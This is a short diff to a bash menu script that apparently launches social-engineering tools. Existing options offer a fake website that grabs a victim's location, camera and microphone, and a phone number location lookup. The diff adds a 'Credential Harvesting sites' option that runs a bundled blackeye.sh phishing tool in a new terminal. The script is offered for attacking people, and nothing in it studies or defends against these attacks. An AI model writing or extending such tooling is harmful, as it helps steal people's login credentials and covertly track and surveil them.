@@ -39,7 +39,8 @@ echo "Fake Website that grabs Location/Camera/Microphone(1)"
 echo "-------------------------"
 echo "Find Phone number location and service(2)"
 echo "-------------------------"
-
+echo "Credential Harvesting sites(3)"
+echo "-------------------------"
 
 
 
@@ -84,3 +85,10 @@ then
 
 fi
 
+
+if [[ $SOCATTACK == '3' ]]
+then
+  echo "created by ErickSonAtHome on github"
+  cd blackeye/
+  konsole -e bash blackeye.sh
+fi
